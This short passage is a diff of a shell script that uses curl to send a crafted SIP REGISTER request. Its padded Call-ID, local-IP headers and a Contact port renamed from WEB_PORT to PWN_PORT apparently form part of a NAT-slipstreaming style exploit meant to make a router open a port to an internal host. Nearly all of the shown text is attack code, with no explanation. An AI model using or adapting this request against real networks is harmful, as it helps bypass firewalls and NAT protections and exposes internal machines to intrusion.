@@ -26,7 +26,7 @@ echo ""
 
 curl -i -s -k -X $'REGISTER' \
 -H $'Via: SIP/2.0/TCP '$LOCAL_IP:$RPORT';branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP' \
--H $'Max-Forwards: 70' -H $'Contact: <sip:wuzzi@'$LOCAL_IP:$WEB_PORT';rinstance=v40f3f83b335139c;transport=TCP>' \
+-H $'Max-Forwards: 70' -H $'Contact: <sip:wuzzi@'$LOCAL_IP:$PWN_PORT';rinstance=v40f3f83b335139c;transport=TCP>' \
 -H $'To: <sip:wuzzi@example.org;transport=TCP>' \
 -H $'From: <sip:wuzzi@example.org;transport=TCP>;tag=U7c3d519' \
 -H $'Call-ID: aaaaaaaaaaaaaaaaa0404aaaaaaaaaaaabbbbbbZjQ4M2M.' \
